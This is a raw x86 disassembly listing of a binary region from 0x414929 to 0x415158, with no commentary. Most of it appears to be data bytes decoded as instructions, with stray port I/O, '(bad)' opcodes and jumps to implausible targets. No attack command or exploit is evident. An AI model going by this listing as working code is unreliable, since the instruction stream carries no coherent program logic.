  414929:	sbb    esi,esp
  41492b:	ins    BYTE PTR es:[edi],dx
  41492c:	ins    DWORD PTR es:[edi],dx
  41492d:	sti    
  41492e:	mov    esi,0x91130071
  414933:	outs   dx,BYTE PTR ds:[esi]
  414934:	outs   dx,BYTE PTR ds:[esi]
  414935:	mov    edx,0xfb001ce2
  41493a:	mov    edx,0x9dc86867
  41493f:	push   0x0
  414941:	retf   
  414942:	scas   eax,DWORD PTR es:[edi]
  414943:	ins    DWORD PTR es:[edi],dx
  414944:	outs   dx,BYTE PTR ds:[esi]
  414945:	ret    0x1ec2
  414948:	xor    ch,cl
  41494a:	sub    DWORD PTR [ecx+0x5f],0xffffffca
  41494e:	fwait
  41494f:	imul   esi,DWORD PTR [ecx-0x17],0xc56d7454
  414956:	rep ins BYTE PTR es:[edi],dx
  414958:	ins    BYTE PTR es:[edi],dx
  414959:	mov    esi,0xe9726a58
  41495e:	pop    esp
  41495f:	push   0x8e6d
	...
  414974:	inc    edi
  414975:	push   0x72
  414977:	jmp    0x88af8fc9
  41497c:	push   ecx
  41497d:	inc    esi
  41497e:	add    BYTE PTR [eax],al
  414980:	arpl   WORD PTR [eax+0x69],bp
  414983:	sub    cl,BYTE PTR gs:[edx]
  414986:	pop    ebp
  414987:	jae    0x4149fe
  414989:	outs   dx,DWORD PTR ds:[esi]
  41498a:	pop    ebp
  41498b:	jae    0x414a02
  41498d:	outs   dx,DWORD PTR ds:[esi]
  41498e:	add    BYTE PTR [esi+0x40],dh
  414991:	push   0x74
  414993:	outs   dx,DWORD PTR ds:[esi]
  414994:	sub    esi,DWORD PTR [eax+eax*1+0x6c]
  414998:	cs inc ebp
  41499a:	outs   dx,DWORD PTR fs:[esi]
  41499c:	mov    edi,0x7a322d0a
  4149a1:	pop    edx
  4149a2:	jae    0x414a09
  4149a4:	pop    ecx
  4149a5:	sbb    dh,BYTE PTR [edx]
  4149a7:	xor    ebp,DWORD PTR [edx+0x17]
  4149aa:	sub    eax,0x5d5f1a00
  4149af:	jb     0x4149a6
  4149b1:	pop    eax
  4149b2:	popa   
  4149b3:	imul   ebx,DWORD PTR [ecx+0x6c],0x61
  4149b7:	outs   dx,DWORD PTR ds:[esi]
  4149b8:	jmp    0x414a27
  4149ba:	popa   
  4149bb:	add    dh,ah
  4149bd:	inc    ebx
  4149be:	outs   dx,BYTE PTR ds:[esi]
  4149bf:	outs   dx,BYTE PTR ds:[esi]
  4149c0:	in     al,0x58
  4149c2:	add    BYTE PTR [ebp-0x8],ch
  4149c5:	ins    DWORD PTR es:[edi],dx
  4149c6:	arpl   WORD PTR [ecx-0xc],bp
  4149c9:	or     dh,BYTE PTR [edx+esi*2-0x10]
  4149cd:	inc    esp
  4149ce:	gs je  0x4149e1
  4149d1:	or     DWORD PTR [ebx+0x6e],ebp
  4149d4:	cmp    eax,0x656e42
	...
  4149e9:	add    BYTE PTR [ecx],bl
  4149eb:	sbb    dh,BYTE PTR [edx]
  4149ed:	xor    ebp,DWORD PTR [eax]
  4149ef:	addr16 pop edi
  4149f1:	add    BYTE PTR [edx],ch
  4149f3:	inc    ecx
  4149f4:	gs arpl dx,ax
  4149f7:	outs   dx,DWORD PTR ds:[esi]
  4149f8:	outs   dx,BYTE PTR ds:[esi]
  4149f9:	add    BYTE PTR [ebx-0x619691a1],dh
  4149ff:	push   esi
  414a00:	add    BYTE PTR [ebx-0x7f],ah
  414a03:	push   esi
  414a04:	gs jae 0x4149e0
  414a07:	pop    eax
  414a08:	pop    ebp
  414a09:	jae    0x4149fb
  414a0b:	xor    BYTE PTR [esi+0x30],0x42
  414a0f:	mov    al,BYTE PTR [ecx]
  414a11:	pop    edi
  414a12:	cmp    eax,0x1e677561
  414a17:	out    dx,al
  414a18:	jb     0x414a8a
  414a1a:	adc    DWORD PTR [eax+0x5a],esp
  414a1d:	ja     0x414a0f
  414a1f:	mov    fs,WORD PTR [ebp+0x6b]
  414a22:	or     DWORD PTR [esp+eax*1],edi
  414a25:	imul   edx,DWORD PTR ds:0x16676040,0xffffffee
  414a2c:	ins    WORD PTR es:[edi],dx
  414a2e:	cmovge esp,DWORD PTR [eax+0x63]
  414a32:	lock push ebx
  414a34:	jb     0x414a9d
  414a36:	aad    0x53
  414a38:	push   0x5d45f071
  414a3d:	jo     0x414a14
  414a3f:	in     eax,dx
  414a40:	jb     0x414aaa
  414a42:	sar    ecx,1
  414a44:	pop    esp
  414a45:	imul   esi,eax,0x13
  414a48:	pop    ebx
  414a49:	outs   dx,BYTE PTR ds:[esi]
  414a4a:	mov    esp,0x645e12
	...
  414a5f:	add    bh,cl
  414a61:	in     eax,dx
  414a62:	pop    ebp
  414a63:	ins    DWORD PTR es:[edi],dx
  414a64:	xbegin 0xedd8b8c4
  414a6a:	pop    ecx
  414a6b:	pop    edi
  414a6c:	mov    ds:0xf0776709,al
  414a71:	loopne 0x414ad3
  414a73:	ins    DWORD PTR es:[edi],dx
  414a74:	mov    edx,edx
  414a76:	ins    BYTE PTR es:[edi],dx
  414a77:	add    bh,al
  414a79:	cld    
  414a7a:	xor    al,0x35
  414a7c:	lock (bad) 
  414a7e:	pop    esi
  414a7f:	jno    0x414a16
  414a81:	mov    ebp,0xa2840059
  414a86:	bound  ebp,QWORD PTR [ecx+0x69]
  414a89:	out    dx,al
  414a8a:	gs addr16 dec edi
  414a8d:	(bad)  
  414a8e:	jne    0x414aef
  414a90:	dec    esp
  414a91:	out    dx,al
  414a92:	add    BYTE PTR fs:[edi+eax*1-0x71],bl
  414a97:	js     0x414af7
  414a99:	imul   eax,DWORD PTR [ecx+esi*2+0x5c9757f0],0x42
  414aa1:	outs   dx,BYTE PTR ds:[esi]
  414aa2:	xchg   ebx,eax
  414aa3:	add    edx,DWORD PTR [edx+0x66]
  414aa6:	xchg   ebp,eax
  414aa7:	addr16 pop ss
  414aa9:	pop    ebx
  414aaa:	out    0x68,eax
  414aac:	push   ss
  414aad:	pop    ebx
  414aae:	mov    WORD PTR [ecx-0x10],?
  414ab1:	gs jge 0x414b2b
  414ab4:	or     BYTE PTR [ebp+edx*2+0x6b],dh
  414ab8:	lock addr16 dec esi
  414abb:	jb     0x414abb
  414abd:	imul   ebx,DWORD PTR [ebx+0x78],0x5d3f0713
	...
  414ad4:	add    BYTE PTR [eax],al
  414ad6:	adc    DWORD PTR [eax+0x4c],esi
  414ad9:	imul   esi,eax,0x56
  414adc:	dec    esi
  414add:	jne    0x414ab2
  414adf:	pop    eax
  414ae0:	out    0x61,eax
  414ae2:	shl    DWORD PTR [ecx+eax*2+0x63],cl
  414ae6:	retf   
  414ae7:	ins    DWORD PTR es:[edi],dx
  414ae8:	adc    eax,0xe72d704
  414aed:	jbe    0x414ac2
  414aef:	pop    ebp
  414af0:	push   es
  414af1:	ja     0x414ad2
  414af3:	push   es
  414af4:	fdiv   DWORD PTR [edx+0x2]
  414af7:	pop    esp
  414af8:	mov    edx,0x105cf066
  414afd:	je     0x414a92
  414aff:	pop    eax
  414b00:	out    0x64,eax
  414b02:	xchg   ebx,eax
  414b03:	je     0x414b09
  414b05:	jno    0x414a96
  414b07:	push   edi
  414b08:	out    0x58,eax
  414b0a:	sahf   
  414b0b:	ins    DWORD PTR es:[edi],dx
  414b0c:	(bad)  
  414b0d:	pop    ebx
  414b0e:	jl     0x414b16
  414b10:	fdiv   DWORD PTR [ebx+edx*4+0x58]
  414b14:	shr    DWORD PTR [edx-0x39],cl
  414b17:	push   es
  414b18:	retf   0x5371
  414b1b:	push   0x6c5e5ab3
  414b20:	add    cl,ch
  414b22:	push   ebp
  414b23:	je     0x414b92
  414b25:	retf   
  414b26:	push   edx
  414b27:	push   ebp
  414b28:	add    BYTE PTR [eax-0x779b95a9],cl
  414b2e:	inc    eax
  414b2f:	pop    es
  414b30:	jb     0x414ab8
  414b32:	inc    edi
  414b33:	push   0x6b
  414b35:	xor    bl,0x57
  414b38:	ins    BYTE PTR es:[edi],dx
  414b39:	mov    BYTE PTR [eax],al
	...
  414b4b:	add    BYTE PTR [edx],bl
  414b4d:	data16 jb 0x414b39
  414b50:	sbb    al,0x6a
  414b52:	jno    0x414ae1
  414b54:	cmp    al,0x6e
  414b56:	add    BYTE PTR [ecx+0x21],bh
  414b59:	inc    edx
  414b5a:	addr16 pop edx
  414b5c:	pop    ss
  414b5d:	pop    es
  414b5e:	jp     0x414bc1
  414b60:	adc    DWORD PTR [ecx+0x62],ebx
  414b63:	inc    edi
  414b64:	pop    ds
  414b65:	pop    es
  414b66:	jno    0x414bb0
  414b68:	pop    ss
  414b69:	push   esi
  414b6a:	arpl   WORD PTR [ebp-0xc],dx
  414b6d:	ins    DWORD PTR es:[edi],dx
  414b6e:	addr16 push edx
  414b70:	iret   
  414b71:	push   es
  414b72:	fs dec eax
  414b74:	shl    BYTE PTR [edx+0x5f],1
  414b77:	cmp    ch,ah
  414b79:	imul   esi,DWORD PTR [edx+0xc],0xffffffd7
  414b7d:	jo     0x414b7f
  414b7f:	adc    eax,0x1d7457cf
  414b84:	xlat   BYTE PTR ds:[ebx]
  414b85:	push   edi
  414b86:	je     0x414b71
  414b88:	xchg   esi,eax
  414b89:	inc    ecx
  414b8a:	jbe    0x414b98
  414b8c:	mov    ds:0xec126169,al
  414b91:	jae    0x414c01
  414b93:	or     al,0x90
  414b95:	jae    0x414c0d
  414b97:	add    al,0xec
  414b99:	push   0x5f
  414b9b:	fild   QWORD PTR [edx-0x6533ff96]
  414ba1:	jb     0x414c10
  414ba3:	fist   WORD PTR [esi+0x7ec16106]
  414ba9:	push   esp
  414baa:	popa   
  414bab:	add    cl,al
  414bad:	add    eax,0x7266
	...
  414bc2:	shr    BYTE PTR [eax+0x6e],0x64
  414bc6:	leave  
  414bc7:	push   0x6b
  414bc9:	fs leave 
  414bcb:	imul   esp,DWORD PTR [ecx+0x73],0x796e3c6d
  414bd2:	fld    DWORD PTR [ebx+0x6b]
  414bd5:	outs   dx,BYTE PTR ds:[esi]
  414bd6:	ins    BYTE PTR es:[edi],dx
  414bd7:	add    eax,0x576a6969
  414bdc:	imul   esi,DWORD PTR [ebx-0x7a],0x6b
  414be0:	je     0x414be2
  414be2:	imul   edx,DWORD PTR [edi],0x32
  414be5:	xor    bl,BYTE PTR [ebx+0x17]
  414be8:	add    BYTE PTR [edx+0x1c],ah
  414beb:	push   0x5a3c6c62
  414bf0:	add    BYTE PTR [ecx],dh
  414bf2:	call   0xd8727912
  414bf7:	sbb    ebp,DWORD PTR ds:0x5f3e2a00
  414bfd:	popa   
  414bfe:	mov    edx,0x59616c3d
  414c03:	inc    ebx
  414c04:	imul   esi,DWORD PTR [edx-0x53],0x6b
  414c08:	outs   dx,BYTE PTR ds:[esi]
  414c09:	xor    bl,BYTE PTR [edx+0x5]
  414c0c:	gs ins BYTE PTR es:[edi],dx
  414c0e:	out    0x54,al
  414c10:	popa   
  414c11:	mul    BYTE PTR [bp+0x0]
  414c15:	data16 idiv BYTE PTR ds:0x3ee86274
  414c1c:	ins    BYTE PTR es:[edi],dx
  414c1d:	xor    DWORD PTR [ecx],ebx
  414c1f:	cmp    DWORD PTR [ebx+0x76],ebp
  414c22:	add    BYTE PTR ds:0x63,bh
	...
  414c38:	imul   DWORD PTR [ebx+0x74]
  414c3b:	push   0x65003ce8
  414c40:	and    al,0x3e
  414c42:	pop    ebp
  414c43:	outs   dx,BYTE PTR ds:[esi]
  414c44:	sbb    al,0x66
  414c46:	ins    BYTE PTR es:[edi],dx
  414c47:	add    al,dh
  414c49:	mov    esp,0xcd876d66
  414c4e:	ins    BYTE PTR es:[edi],dx
  414c4f:	add    BYTE PTR [esi-0x5d],dl
  414c52:	imul   dx,WORD PTR [edi-0x38],0x5f
  414c58:	arpl   di,cx
  414c5a:	pop    eax
  414c5b:	imul   ebx,DWORD PTR [ecx-0x12],0x58
  414c5f:	pop    edi
  414c60:	dec    eax
  414c61:	and    DWORD PTR [eax+0x6c],0x5f5bee54
  414c68:	inc    ebx
  414c69:	mov    DWORD PTR [edi+0x0],edx
  414c6c:	dec    edx
  414c6d:	popa   
  414c6e:	pop    ecx
  414c6f:	outs   dx,BYTE PTR ds:[esi]
  414c70:	lock sahf 
  414c72:	je     0x414ca6
  414c74:	pop    ds
  414c75:	popf   
  414c76:	pusha  
  414c77:	xor    al,0x22
  414c79:	out    dx,al
  414c7a:	arpl   WORD PTR [edi+0x12],bx
  414c7d:	push   edi
  414c7e:	add    DWORD PTR [edx+0x15],esi
  414c81:	push   edx
  414c82:	xor    esi,DWORD PTR [edx]
  414c84:	ret    
  414c85:	in     eax,dx
  414c86:	arpl   WORD PTR [ecx+edx*1+0x4c],bp
  414c8a:	pop    eax
  414c8b:	pop    edi
  414c8c:	lock cmp eax,0x4cde6776
  414c92:	pop    edi
  414c93:	add    cl,ah
  414c95:	sbb    BYTE PTR [edi+0x72],bl
  414c98:	in     al,0xed
  414c9a:	pushw  0x0
	...
  414cae:	int    0x21
  414cb0:	jne    0x414d15
  414cb2:	shr    ebp,1
  414cb4:	xor    BYTE PTR [ebx],dh
  414cb6:	std    
  414cb7:	mov    edx,0x7d10030
  414cbc:	popa   
  414cbd:	arpl   sp,ax
  414cbf:	mov    esi,0xdb916801
  414cc4:	pop    ebp
  414cc5:	popa   
  414cc6:	xchg   edi,eax
  414cc7:	(bad)  [eax+0x0]
  414cca:	xchg   esp,eax
  414ccb:	adc    ch,BYTE PTR [esp+esi*2-0x73]
  414ccf:	fild   DWORD PTR [ecx]
  414cd1:	jno    0x414c64
  414cd3:	push   es
  414cd4:	frstor [eax-0x74]
  414cd7:	push   es
  414cd8:	sbb    BYTE PTR ds:0x371a14c2,dh
  414cde:	lock outs dx,BYTE PTR ds:[esi]
  414ce0:	enter  0x5c57,0x70
  414ce4:	out    0x5d,eax
  414ce6:	inc    edi
  414ce7:	push   esp
  414ce8:	mov    bh,0x60
  414cea:	bound  eax,QWORD PTR [edi]
  414cec:	retf   
  414ced:	fs inc esi
  414cef:	outs   dx,BYTE PTR ds:[esi]
  414cf0:	les    edx,FWORD PTR [edi+0x5c]
  414cf3:	push   0xffffffe7
  414cf5:	pop    esi
  414cf6:	dec    edi
  414cf7:	pop    ebx
  414cf8:	xchg   ebx,eax
  414cf9:	pusha  
  414cfa:	dec    esi
  414cfb:	pop    es
  414cfc:	mov    ah,BYTE PTR [ecx+eax*2+0x54]
  414d00:	and    BYTE PTR [eax-0x10],0x53
  414d04:	jnp    0x414d66
  414d06:	adc    al,0x73
  414d08:	mov    BYTE PTR [ebx],al
  414d0a:	and    BYTE PTR [ebp-0x78],dl
  414d0d:	ins    BYTE PTR es:[edi],dx
  414d0e:	adc    edx,DWORD PTR [ebp-0x19]
  414d11:	pop    ebx
	...
  414d22:	add    BYTE PTR [eax],al
  414d24:	sbb    eax,0xd594b5b
  414d29:	pop    es
  414d2a:	push   esi
  414d2b:	pop    ebx
  414d2c:	push   cs
  414d2d:	imul   eax,DWORD PTR [esi+0x71],0x1
  414d31:	pop    es
  414d32:	cmp    al,0x6f
  414d34:	loope  0x414d90
  414d36:	dec    ebx
  414d37:	pop    ebx
  414d38:	rol    DWORD PTR [esi],cl
  414d3a:	inc    esi
  414d3b:	arpl   sp,sp
  414d3d:	imul   edi,DWORD PTR [edx],0x3b6dd204
  414d43:	pop    eax
  414d44:	aad    0x65
  414d46:	sbb    ebx,DWORD PTR [edi-0x3f]
  414d49:	push   es
  414d4a:	push   es
  414d4b:	pop    esp
  414d4c:	shr    BYTE PTR [edx+0x1b],cl
  414d4f:	pop    edx
  414d50:	lock addr16 add eax,0x146b9a5c
  414d57:	add    al,0xd7
  414d59:	adc    al,0xba
  414d5b:	das    
  414d5c:	jecxz  0x414d76
  414d5e:	add    BYTE PTR [esi-0x16cfe835],bh
  414d64:	repz arpl WORD PTR [edx+eiz*8+0x7d],si
  414d69:	pop    eax
  414d6a:	imul   ecx,esi,0xdc757085
  414d70:	rep outs dx,BYTE PTR ds:[esi]
  414d72:	je     0x414d49
  414d74:	arpl   WORD PTR [ecx],sp
  414d76:	sub    eax,0x75546116
  414d7b:	rcpps  xmm5,XMMWORD PTR [ebx+0x62]
  414d7f:	int3   
  414d80:	pop    ebp
  414d81:	fs push 0x6d67e9c0
  414d87:	xchg   esp,eax
	...
  414d98:	add    BYTE PTR [eax],al
  414d9a:	adc    eax,0x3e1301f
  414d9f:	sub    al,0x70
  414da1:	xchg   BYTE PTR [ecx],bl
  414da3:	push   esi
  414da4:	sub    eax,0x63531286
  414da9:	xlat   BYTE PTR ds:[ebx]
  414daa:	and    ebp,DWORD PTR [edi+0x70]
  414dad:	jmp    0x79b5a0ed
  414db2:	lds    ebp,FWORD PTR [ebx]
  414db4:	sub    eax,0x5f561e8b
  414db9:	push   edi
  414dba:	adc    BYTE PTR [eax+0x6b],bl
  414dbd:	push   eax
  414dbe:	sbb    BYTE PTR [edx+0x2e],ch
  414dc1:	dec    eax
  414dc2:	add    BYTE PTR [ebx+ebp*2+0x4a],ch
  414dc6:	enter  0x6165,0x52
  414dca:	or     ch,BYTE PTR [eax+0x6d]
  414dcd:	add    ecx,DWORD PTR [edi+edx*1]
  414dd0:	cmp    cl,bh
  414dd2:	clc    
  414dd3:	push   esi
  414dd4:	ins    DWORD PTR es:[edi],dx
  414dd5:	aas    
  414dd6:	fld    TBYTE PTR [ebx]
  414dd8:	gs or  al,al
  414ddb:	imul   ebp,DWORD PTR [esi],0x569c19
  414de1:	jmp    0x19b5a081
  414de6:	fisubr WORD PTR [ebx]
  414de8:	sub    eax,0x7056f700
  414ded:	cs hlt 
  414def:	fs jno 0x414e64
  414df2:	out    dx,eax
  414df3:	cmp    eax,0x3d0f6e61
  414df8:	arpl   WORD PTR cs:[esi],bx
  414dfb:	xor    eax,0x372b
	...
  414e10:	adc    eax,DWORD PTR [ebp+edx*2+0x37]
  414e14:	and    DWORD PTR [ebx],esi
  414e16:	cs sar DWORD PTR gs:[eax+eax*1],0x68
  414e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e1d:	ins    DWORD PTR es:[edi],dx
  414e1e:	jo     0x414e5a
  414e20:	out    dx,al
  414e21:	push   DWORD PTR [edx+0x77]
  414e24:	xchg   esi,eax
  414e25:	jmp    FWORD PTR [esi+0x70]
  414e28:	mov    ah,0x6d
  414e2a:	je     0x414e91
  414e2c:	imul   edi,edi,0x5e
  414e2f:	outs   dx,DWORD PTR ds:[esi]
  414e30:	ins    BYTE PTR es:[edi],dx
  414e31:	(bad)  
  414e32:	push   0x55309869
  414e37:	addr16 jmp DWORD PTR [bx+si+0x78]
  414e3c:	je     0x414e47
  414e3e:	push   0x3a5a2574
  414e43:	das    
  414e44:	scas   al,BYTE PTR es:[edi]
  414e45:	pop    ecx
  414e46:	push   0x6f3f056f
  414e4b:	pushw  ds
  414e4d:	push   edi
  414e4e:	imul   ebp,DWORD PTR [esi],0x2a
  414e51:	imul   ebp,DWORD PTR ss:[edi],0x2e493714
  414e58:	mov    ah,0x6a
  414e5a:	popa   
  414e5b:	add    cl,al
  414e5d:	push   esi
  414e5e:	je     0x414ed0
  414e60:	repz cmc 
  414e62:	sub    dh,BYTE PTR [edi+0x16]
  414e65:	outs   dx,BYTE PTR ds:[esi]
  414e66:	cs fs mov eax,0xe56e653d
  414e6d:	addr16 jb 0x414ede
  414e70:	call   0xb0b3de
	...
  414e85:	add    al,dh
  414e87:	add    eax,0x10de6c63
  414e8c:	push   ebp
  414e8d:	imul   edx,edi,0xffffffdb
  414e90:	outs   dx,DWORD PTR ds:[esi]
  414e91:	pop    eax
  414e92:	xchg   ebp,eax
  414e93:	int    0x60
  414e95:	js     0x414e24
  414e97:	out    dx,eax
  414e98:	add    DWORD PTR [edi-0x5b],edx
  414e9b:	es push esp
  414e9d:	push   ebp
  414e9e:	lods   al,BYTE PTR ds:[esi]
  414e9f:	lods   eax,DWORD PTR ds:[esi]
  414ea0:	cmp    al,0x4c
  414ea2:	mov    ch,0xff
  414ea4:	dec    edx
  414ea5:	push   ebx
  414ea6:	test   eax,0x36443a9f
  414eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eac:	xor    eax,0x50a72043
  414eb1:	inc    edi
  414eb2:	xor    eax,DWORD PTR [eax-0x54c3afb4]
  414eb8:	cmp    eax,0x3c732930
  414ebd:	das    
  414ebe:	push   ss
  414ebf:	mov    esi,0xedf00001
  414ec4:	add    DWORD PTR [edx],eax
  414ec6:	lock mov ds:0xef454436,al
  414ecc:	add    al,0x0
  414ece:	lock in eax,dx
  414ed0:	add    DWORD PTR [eax],eax
  414ed2:	lock in eax,dx
  414ed4:	add    DWORD PTR [ecx+0x27],edx
  414ed7:	lods   al,BYTE PTR ds:[esi]
  414ed8:	dec    ebp
  414ed9:	push   ebp
  414eda:	xor    DWORD PTR [eax+0x37355c40],eax
  414ee0:	popa   
  414ee1:	jb     0x414ef2
  414ee3:	inc    ecx
  414ee4:	push   ebp
  414ee5:	data16 cld 
  414ee7:	adc    DWORD PTR [ebp+0x67],ecx
	...
  414efa:	add    BYTE PTR [eax],al
  414efc:	fiadd  WORD PTR [ecx+0x55]
  414eff:	jne    0x414ee4
  414f01:	and    DWORD PTR [ecx+0x73],eax
  414f04:	loop   0x414f25
  414f06:	pop    edi
  414f07:	outs   dx,BYTE PTR ds:[esi]
  414f08:	fdiv   st(3),st
  414f0a:	pop    esi
  414f0b:	jb     0x414ed0
  414f0d:	inc    esi
  414f0e:	push   ebp
  414f0f:	outs   dx,BYTE PTR ds:[esi]
  414f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f11:	push   es
  414f12:	cmp    al,0x56
  414f14:	xlat   BYTE PTR ds:[ebx]
  414f15:	ins    BYTE PTR es:[edi],dx
  414f16:	sbb    dh,BYTE PTR [eax-0x69]
  414f19:	push   0x3
  414f1b:	add    al,0xc3
  414f1d:	ins    BYTE PTR es:[edi],dx
  414f1e:	add    BYTE PTR [esi-0x5f],dl
  414f21:	push   edx
  414f22:	or     BYTE PTR [eax-0x74],bl
  414f25:	aaa    
  414f26:	repz jno 0x414eb8
  414f29:	ins    BYTE PTR es:[edi],dx
  414f2a:	push   cs
  414f2b:	add    al,0xb4
  414f2d:	ins    DWORD PTR es:[edi],dx
  414f2e:	cli    
  414f2f:	jae    0x414ec5
  414f31:	gs loopne 0x414f69
  414f34:	lahf   
  414f35:	imul   eax,esp,0xe7069403
  414f3b:	add    esi,eax
  414f3d:	push   es
  414f3e:	out    0x3,eax
  414f40:	lock push es
  414f42:	shl    BYTE PTR [eax+0x62],cl
  414f45:	ins    DWORD PTR es:[edi],dx
  414f46:	les    edx,FWORD PTR [edi+0x21]
  414f49:	sbb    DWORD PTR ds:0xe76b5c60,eax
  414f4f:	dec    esi
  414f50:	sbb    al,0x38
  414f52:	scas   al,BYTE PTR es:[edi]
  414f53:	pusha  
  414f54:	inc    esp
  414f55:	inc    esi
  414f56:	mov    ch,BYTE PTR [edi+0x4f]
  414f59:	push   ebp
  414f5a:	mov    WORD PTR [edx+0x1d],es
  414f5d:	ins    DWORD PTR es:[edi],dx
  414f5e:	call   0x0:0x56
	...
  414f71:	add    BYTE PTR [edx+eiz*2],dl
  414f74:	call   0x656:0x90582160
  414f7b:	dec    esi
  414f7c:	mov    eax,DWORD PTR [ebx]
  414f7e:	and    BYTE PTR [ecx+0x7e],bl
  414f81:	bound  edx,QWORD PTR [ebx]
  414f83:	pop    eax
  414f84:	pop    edx
  414f85:	cmp    edx,DWORD PTR [ebx+esi*1]
  414f88:	dec    esi
  414f89:	push   ecx
  414f8a:	adc    ebx,DWORD PTR [eax+0x5a]
  414f8d:	pop    ebx
  414f8e:	(bad)  [eax+eiz*1+0x60]
  414f92:	lock push es
  414f94:	out    0x3,eax
  414f96:	lock push es
  414f98:	out    0x3,eax
  414f9a:	lock push es
  414f9c:	add    BYTE PTR [edx-0x3e],cl
  414f9f:	push   ebx
  414fa0:	jo     0x414fd7
  414fa2:	add    DWORD PTR [ecx],ebx
  414fa4:	cs or  eax,0x2a006a98
  414faa:	ret    0x7053
  414fad:	sbb    eax,0x1b706cbf
  414fb2:	mov    ebp,0xa00a6352
  414fb7:	inc    edx
  414fb8:	pop    edi
  414fb9:	cmc    
  414fba:	xchg   edx,eax
  414fbb:	push   es
  414fbc:	add    cl,ch
  414fbe:	repz push es
  414fc0:	cs add al,0x94
  414fc3:	add    BYTE PTR [bp+si+0x64a4],bh
  414fc8:	je     0x414fa0
  414fca:	xchg   edx,eax
  414fcb:	pop    eax
  414fcc:	arpl   WORD PTR [ebp-0x44919dc4],si
  414fd2:	xor    dh,BYTE PTR ds:0xd600
	...
  414fe8:	arpl   WORD PTR [esi+0x6e],sp
  414feb:	jmp    0x694156e2
  414ff0:	inc    ecx
  414ff1:	outs   dx,DWORD PTR ds:[esi]
  414ff2:	arpl   WORD PTR [ebp-0x28cde7e1],di
  414ff8:	pop    ds
  414ff9:	imul   ebp,DWORD PTR [ecx+ebp*8+0x20],0x4f
  414ffe:	inc    ebp
  414fff:	mov    WORD PTR [edi],ds
  415001:	inc    ecx
  415002:	ins    DWORD PTR es:[edi],dx
  415003:	jge    0x41504c
  415005:	data16 jb 0x414fa1
  415008:	adc    dl,BYTE PTR [ebx+0x68]
  41500b:	test   al,0xf3
  41500d:	push   es
  41500e:	add    cl,ch
  415010:	repz push es
  415012:	leave  
  415013:	shl    BYTE PTR [edx],0x7
  415016:	loopne 0x415028
  415018:	xor    eax,DWORD PTR [edi]
  41501a:	lock adc BYTE PTR [ebx],dh
  41501d:	pop    es
  41501e:	push   es
  41501f:	add    esi,DWORD PTR [ebx-0x4cfcebfa]
  415025:	push   es
  415026:	and    al,0x0
  415028:	add    eax,DWORD PTR [esi+0x0]
  41502b:	xor    al,0x3
  41502d:	inc    esi
  41502e:	add    BYTE PTR [ecx-0xd],cl
  415031:	inc    ebp
  415032:	add    BYTE PTR [eax-0xd],ah
  415035:	inc    ebp
  415036:	add    BYTE PTR [ebx+eiz*1+0x45],dh
  41503a:	add    BYTE PTR [ebp-0x4effbadd],cl
  415040:	xor    eax,DWORD PTR [ebp+0x0]
  415043:	into   
  415044:	xor    eax,DWORD PTR [ebp+0x0]
  415047:	add    BYTE PTR [ecx],cl
  415049:	push   es
  41504a:	add    BYTE PTR [ecx],al
	...
  41505c:	add    BYTE PTR [eax],al
  41505e:	or     DWORD PTR [esi],eax
  415060:	add    BYTE PTR ds:0x4d000619,0x0
  415067:	es inc esp
  415069:	outs   dx,DWORD PTR ds:[esi]
  41506a:	sub    ch,BYTE PTR [ecx+0x69]
  41506d:	gs daa 
  41506f:	push   0x6f
  415071:	add    al,bl
  415073:	add    eax,0x5e38000
  415078:	add    BYTE PTR [eax],al
  41507a:	mov    BYTE PTR [ebp+0x70],dl
  41507d:	inc    esp
  41507e:	test   al,0x69
  415080:	pop    ebp
  415081:	add    al,bl
  415083:	add    eax,0x5b58000
  415088:	add    BYTE PTR [eax],al
  41508a:	test   DWORD PTR [edx],esi
  41508c:	pop    edi
  41508d:	popa   
  41508e:	gs and eax,0x1989703d
  415094:	pop    ebp
  415095:	je     0x41510f
  415097:	add    eax,0x8589fffd
  41509c:	and    BYTE PTR [eax],al
  41509e:	mov    DWORD PTR ds:0x3d7a613f,eax
  4150a4:	popa   
  4150a5:	add    BYTE PTR [eax-0x177ffffb],bl
  4150ab:	add    al,BYTE PTR [eax]
  4150ad:	add    dl,cl
  4150af:	push   ebp
  4150b0:	imul   ebp,DWORD PTR [ebx-0x10],0x46
  4150b4:	addr16 jno 0x4150a7
  4150b7:	out    dx,al
  4150b8:	add    DWORD PTR [eax],eax
  4150ba:	jo     0x4150c9
  4150bc:	add    al,0x0
  4150be:	lock pop ss
  4150c0:	imul   esi,DWORD PTR [ecx+0x0],0x0
	...
  4150d4:	les    eax,FWORD PTR [eax+0x56]
  4150d7:	ja     0x4150c9
  4150d9:	in     eax,dx
  4150da:	add    DWORD PTR [eax],eax
  4150dc:	jo     0x4150c8
  4150de:	add    DWORD PTR [eax],eax
  4150e0:	lock sub bl,BYTE PTR [ebx+0x20]
  4150e4:	mov    ah,0x0
  4150e6:	gs jae 0x41507e
  4150e9:	add    dh,BYTE PTR [edx+0x74]
  4150ec:	mov    ds:0xf00003ef,eax
  4150f1:	outs   dx,DWORD PTR ds:[esi]
  4150f2:	and    eax,0x46eff000
  4150f7:	ins    DWORD PTR es:[edi],dx
  4150f8:	xchg   ebp,eax
  4150f9:	fidiv  DWORD PTR [edx+0x6e]
  4150fc:	shr    BYTE PTR [esi-0x31538faf],1
  415102:	push   ebp
  415103:	pop    edi
  415104:	lock out dx,al
  415106:	add    DWORD PTR [eax],eax
  415108:	jo     0x41510b
  41510a:	add    al,0x0
  41510c:	lock xchg edx,eax
  41510e:	pop    esp
  41510f:	and    BYTE PTR [eax-0x49],al
  415112:	data16 je 0x41515a
  415115:	pushf  
  415116:	push   0x1ebf071
  41511b:	add    BYTE PTR [eax-0x50],dh
  41511e:	add    DWORD PTR [eax],eax
  415120:	lock lods al,BYTE PTR ds:[esi]
  415122:	jb     0x41518f
  415124:	sbb    eax,0x2c206f81
  415129:	pop    ecx
  41512a:	data16 jae 0x41513a
  41512d:	mov    ebp,DWORD PTR [edi+0x74]
  415130:	and    ebp,esi
  415132:	add    eax,DWORD PTR [eax]
  415134:	lock ins DWORD PTR es:[edi],dx
  415136:	xor    DWORD PTR [eax],eax
	...
  415148:	add    BYTE PTR [eax],al
  41514a:	lock in eax,dx
  41514c:	inc    esi
  41514d:	ins    DWORD PTR es:[edi],dx
  41514e:	or     eax,0x6735407
  415153:	daa    
  415154:	sub    BYTE PTR [eax-0x25],ch
  415157:	ins    DWORD PTR es:[edi],dx
  415158:	inc    ebp
